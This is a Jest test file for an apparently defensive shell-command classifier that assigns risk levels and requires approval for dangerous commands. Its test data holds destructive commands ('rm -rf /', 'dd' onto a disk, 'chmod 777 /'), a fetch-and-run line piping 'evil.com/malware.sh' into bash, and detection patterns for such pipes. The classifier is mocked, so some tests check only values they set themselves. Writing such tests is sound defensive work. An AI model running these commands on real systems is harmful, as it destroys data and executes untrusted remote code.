import { describe, test, expect, jest, beforeEach, afterEach } from '@jest/globals';
import * as fs from 'fs/promises';
import * as path from 'path';
import { TestUtils } from '../../../helpers/test-utils';
import { CommandTestHelper } from '../../../helpers/command-helpers';

// Import test fixtures
import dangerousCommands from '../../../fixtures/commands/dangerous-commands.json';
import safeCommands from '../../../fixtures/commands/safe-commands.json';
import edgeCases from '../../../fixtures/commands/edge-cases.json';

// Mock command classifier (to be implemented)
const mockClassifier = {
  classify: jest.fn(),
  analyzeContext: jest.fn(),
  getRiskLevel: jest.fn(),
  getCategory: jest.fn(),
  loadUserRules: jest.fn(),
  addToSafeList: jest.fn(),
  addToDangerList: jest.fn(),
};

describe('Command Classification', () => {
  let testEnv: any;
  
  beforeEach(async () => {
    testEnv = await TestUtils.createTestEnvironment();
    jest.clearAllMocks();
  });
  
  afterEach(async () => {
    await testEnv.cleanup();
  });
  
  describe('Basic Classification', () => {
    test('correctly classifies known dangerous commands', async () => {
      const dangerousCategories = Object.entries(dangerousCommands);
      
      for (const [category, commands] of dangerousCategories) {
        for (const cmdData of commands as any[]) {
          const result = await mockClassifier.classify(cmdData.command);
          
          expect(result).toMatchObject({
            command: cmdData.command,
            riskLevel: cmdData.riskLevel,
            category: category,
            isDangerous: true,
            requiresApproval: true,
          });
        }
      }
    });
    
    test('correctly classifies known safe commands', async () => {
      const safeCategories = Object.entries(safeCommands);
      
      for (const [category, commands] of safeCategories) {
        for (const cmdData of commands as any[]) {
          mockClassifier.classify.mockResolvedValue({
            command: cmdData.command,
            riskLevel: 'SAFE',
            category: category,
            isDangerous: false,
            requiresApproval: false,
            readonly: cmdData.readonly,
          });
          
          const result = await mockClassifier.classify(cmdData.command);
          
          expect(result.isDangerous).toBe(false);
          expect(result.requiresApproval).toBe(false);
          expect(result.readonly).toBe(true);
        }
      }
    });
    
    test('handles unknown commands with caution', async () => {
      const unknownCommands = [
        'custom-script',
        'proprietary-tool',
        '/opt/custom/bin/tool',
        'newcommand --unknown-flag',
      ];
      
      for (const cmd of unknownCommands) {
        mockClassifier.classify.mockResolvedValue({
          command: cmd,
          riskLevel: 'UNKNOWN',
          category: 'unknown',
          isDangerous: null,
          requiresApproval: true,
          reason: 'Unknown command requires analysis',
        });
        
        const result = await mockClassifier.classify(cmd);
        
        expect(result.riskLevel).toBe('UNKNOWN');
        expect(result.requiresApproval).toBe(true);
      }
    });
  });
  
  describe('Risk Level Assessment', () => {
    test('assigns correct risk levels', async () => {
      const riskTests = [
        { command: 'ls', expectedRisk: 'SAFE' },
        { command: 'rm file.txt', expectedRisk: 'CAUTION' },
        { command: 'rm -rf /home/user', expectedRisk: 'HIGH' },
        { command: 'rm -rf /', expectedRisk: 'CRITICAL' },
        { command: 'chmod 777 /', expectedRisk: 'CRITICAL' },
        { command: 'dd if=/dev/zero of=/dev/sda', expectedRisk: 'CRITICAL' },
      ];
      
      for (const { command, expectedRisk } of riskTests) {
        mockClassifier.getRiskLevel.mockReturnValue(expectedRisk);
        
        const risk = await mockClassifier.getRiskLevel(command);
        
        expect(risk).toBe(expectedRisk);
      }
    });
    
    test('considers command arguments in risk assessment', async () => {
      const argumentTests = [
        { 
          command: 'find',
          args: ['.', '-name', '*.txt'],
          risk: 'SAFE',
        },
        {
          command: 'find',
          args: ['/', '-name', '*.conf', '-exec', 'rm', '{}', ';'],
          risk: 'CRITICAL',
        },
        {
          command: 'curl',
          args: ['https://example.com'],
          risk: 'CAUTION',
        },
        {
          command: 'curl',
          args: ['https://evil.com/malware.sh', '|', 'bash'],
          risk: 'CRITICAL',
        },
      ];
      
      for (const test of argumentTests) {
        mockClassifier.getRiskLevel.mockReturnValue(test.risk);
        
        const risk = await mockClassifier.getRiskLevel(test.command, test.args);
        
        expect(risk).toBe(test.risk);
      }
    });
  });
  
  describe('Context-Aware Classification', () => {
    test('considers current working directory', async () => {
      const contextTests = edgeCases.context_dependent;
      
      for (const test of contextTests) {
        for (const [contextType, context] of Object.entries(test.contexts)) {
          mockClassifier.analyzeContext.mockResolvedValue({
            command: test.command,
            context: { cwd: context.cwd },
            riskLevel: context.riskLevel,
            description: context.description,
          });
          
          const result = await mockClassifier.analyzeContext(test.command, {
            cwd: context.cwd,
          });
          
          expect(result.riskLevel).toBe(context.riskLevel);
        }
      }
    });
    
    test('analyzes command chains and pipes', async () => {
      const chainTests = edgeCases.chained_commands;
      
      for (const test of chainTests) {
        mockClassifier.classify.mockResolvedValue({
          command: test.command,
          isChain: true,
          riskLevel: test.riskLevel,
          risks: test.risks,
          requiresApproval: test.riskLevel !== 'SAFE',
        });
        
        const result = await mockClassifier.classify(test.command);
        
        expect(result.isChain).toBe(true);
        expect(result.risks).toEqual(test.risks);
      }
    });
    
    test('handles variable expansion risks', async () => {
      const varTests = edgeCases.special_characters;
      
      for (const test of varTests) {
        mockClassifier.classify.mockResolvedValue({
          command: test.command,
          hasVariables: true,
          riskLevel: test.riskLevel,
          risks: test.risks,
          requiresApproval: test.riskLevel !== 'SAFE',
        });
        
        const result = await mockClassifier.classify(test.command);
        
        expect(result.hasVariables).toBe(true);
        expect(result.riskLevel).toBe(test.riskLevel);
      }
    });
  });
  
  describe('Sudo Command Handling', () => {
    test('treats all sudo commands as dangerous by default', async () => {
      const sudoCommands = [
        'sudo ls',
        'sudo apt update',
        'sudo systemctl restart nginx',
        'sudo -u postgres psql',
        'sudo -i',
        'sudo su -',
      ];
      
      for (const cmd of sudoCommands) {
        mockClassifier.classify.mockResolvedValue({
          command: cmd,
          isSudo: true,
          riskLevel: 'HIGH',
          isDangerous: true,
          requiresApproval: true,
          reason: 'All sudo commands require approval',
        });
        
        const result = await mockClassifier.classify(cmd);
        
        expect(result.isSudo).toBe(true);
        expect(result.isDangerous).toBe(true);
        expect(result.requiresApproval).toBe(true);
      }
    });
    
    test('analyzes sudo command variants', async () => {
      const sudoVariants = edgeCases.sudo_variants;
      
      for (const variant of sudoVariants) {
        mockClassifier.classify.mockResolvedValue({
          command: variant.command,
          isSudo: true,
          riskLevel: variant.riskLevel,
          risks: variant.risks,
          requiresApproval: true,
        });
        
        const result = await mockClassifier.classify(variant.command);
        
        expect(result.riskLevel).toBe(variant.riskLevel);
        expect(result.risks).toEqual(variant.risks);
      }
    });
  });
  
  describe('User-Defined Rules', () => {
    test('loads user safe list correctly', async () => {
      const userSafeList = [
        'custom-backup-script',
        'company-deploy-tool',
        'internal-health-check',
      ];
      
      // Create user config
      const configPath = path.join(testEnv.tempDir, '.deliberate', 'user-rules.json');
      await fs.mkdir(path.dirname(configPath), { recursive: true });
      await fs.writeFile(configPath, JSON.stringify({
        safeList: userSafeList,
      }));
      
      await mockClassifier.loadUserRules(configPath);
      
      for (const cmd of userSafeList) {
        mockClassifier.classify.mockResolvedValue({
          command: cmd,
          riskLevel: 'SAFE',
          isDangerous: false,
          requiresApproval: false,
          source: 'user-defined',
        });
        
        const result = await mockClassifier.classify(cmd);
        
        expect(result.isDangerous).toBe(false);
        expect(result.source).toBe('user-defined');
      }
    });
    
    test('loads user danger list correctly', async () => {
      const userDangerList = [
        'legacy-cleanup-script',
        'deprecated-tool',
        'risky-automation',
      ];
      
      const configPath = path.join(testEnv.tempDir, '.deliberate', 'user-rules.json');
      await fs.mkdir(path.dirname(configPath), { recursive: true });
      await fs.writeFile(configPath, JSON.stringify({
        dangerList: userDangerList,
      }));
      
      await mockClassifier.loadUserRules(configPath);
      
      for (const cmd of userDangerList) {
        mockClassifier.classify.mockResolvedValue({
          command: cmd,
          riskLevel: 'HIGH',
          isDangerous: true,
          requiresApproval: true,
          source: 'user-defined',
        });
        
        const result = await mockClassifier.classify(cmd);
        
        expect(result.isDangerous).toBe(true);
        expect(result.source).toBe('user-defined');
      }
    });
    
    test('user rules override default classification', async () => {
      // Add normally safe command to danger list
      await mockClassifier.addToDangerList('echo');
      
      mockClassifier.classify.mockResolvedValue({
        command: 'echo "test"',
        riskLevel: 'HIGH',
        isDangerous: true,
        requiresApproval: true,
        source: 'user-override',
        originalClassification: 'SAFE',
      });
      
      const result = await mockClassifier.classify('echo "test"');
      
      expect(result.isDangerous).toBe(true);
      expect(result.source).toBe('user-override');
      expect(result.originalClassification).toBe('SAFE');
    });
  });
  
  describe('Pattern Matching', () => {
    test('detects dangerous patterns in commands', async () => {
      const dangerousPatterns = [
        { pattern: /rm\s+-rf\s+\//, description: 'Recursive force remove from root' },
        { pattern: /dd\s+.*of=\/dev\/[sh]d/, description: 'Direct disk write' },
        { pattern: />\s*\/dev\/[sh]d/, description: 'Redirect to disk device' },
        { pattern: /chmod\s+777/, description: 'World-writable permissions' },
        { pattern: /curl.*\|\s*bash/, description: 'Remote script execution' },
        { pattern: /wget.*\|\s*sh/, description: 'Remote script execution' },
      ];
      
      for (const { pattern, description } of dangerousPatterns) {
        const testCmd = 'test command matching pattern';
        
        mockClassifier.classify.mockImplementation(async (cmd: string) => {
          if (pattern.test(cmd)) {
            return {
              command: cmd,
              riskLevel: 'CRITICAL',
              isDangerous: true,
              requiresApproval: true,
              matchedPattern: pattern.toString(),
              patternDescription: description,
            };
          }
          return { command: cmd, riskLevel: 'SAFE' };
        });
      }
    });
    
    test('identifies safe command patterns that look dangerous', async () => {
      const trickyTests = edgeCases.tricky_safe_commands;
      
      for (const test of trickyTests) {
        mockClassifier.classify.mockResolvedValue({
          command: test.command,
          riskLevel: test.riskLevel,
          isDangerous: false,
          requiresApproval: false,
          notes: test.notes,
        });
        
        const result = await mockClassifier.classify(test.command);
        
        expect(result.isDangerous).toBe(false);
        expect(result.riskLevel).toBe('SAFE');
      }
    });
  });
  
  describe('Complex Command Analysis', () => {
    test('analyzes pipe commands correctly', async () => {
      const pipeTests = edgeCases.pipe_commands;
      
      for (const test of pipeTests) {
        mockClassifier.classify.mockResolvedValue({
          command: test.command,
          isPipe: true,
          riskLevel: test.riskLevel,
          risks: test.risks,
          pipeStages: test.command.split('|').map(s => s.trim()),
          requiresApproval: test.riskLevel !== 'SAFE',
        });
        
        const result = await mockClassifier.classify(test.command);
        
        expect(result.isPipe).toBe(true);
        expect(result.pipeStages).toHaveLength(
          test.command.split('|').length
        );
      }
    });
    
    test('evaluates script execution risks', async () => {
      const scriptTests = edgeCases.ambiguous_commands;
      
      for (const test of scriptTests) {
        mockClassifier.classify.mockResolvedValue({
          command: test.command,
          isScriptExecution: true,
          riskLevel: test.riskLevel,
          requiresAnalysis: true,
          analysisType: test.analysis,
        });
        
        const result = await mockClassifier.classify(test.command);
        
        expect(result.requiresAnalysis).toBe(true);
        expect(result.analysisType).toBe(test.analysis);
      }
    });
  });
  
  describe('Performance', () => {
    test('classifies commands within acceptable time', async () => {
      const commands = [
        'ls -la',
        'rm -rf /tmp/test',
        'find / -name "*.log" -exec grep "error" {} \\;',
        'ps aux | grep firefox | awk \'{print $2}\' | xargs kill',
      ];
      
      for (const cmd of commands) {
        const startTime = Date.now();
        
        mockClassifier.classify.mockResolvedValue({
          command: cmd,
          riskLevel: 'CAUTION',
        });
        
        await mockClassifier.classify(cmd);
        
        const duration = Date.now() - startTime;
        
        // Classification should be fast (< 10ms)
        expect(duration).toBeLessThan(10);
      }
    });
    
    test('caches classification results', async () => {
      const command = 'git status';
      
      // First call
      mockClassifier.classify.mockResolvedValue({
        command,
        riskLevel: 'SAFE',
        cached: false,
      });
      
      const result1 = await mockClassifier.classify(command);
      expect(result1.cached).toBe(false);
      
      // Second call should use cache
      mockClassifier.classify.mockResolvedValue({
        command,
        riskLevel: 'SAFE',
        cached: true,
      });
      
      const result2 = await mockClassifier.classify(command);
      expect(result2.cached).toBe(true);
    });
  });
});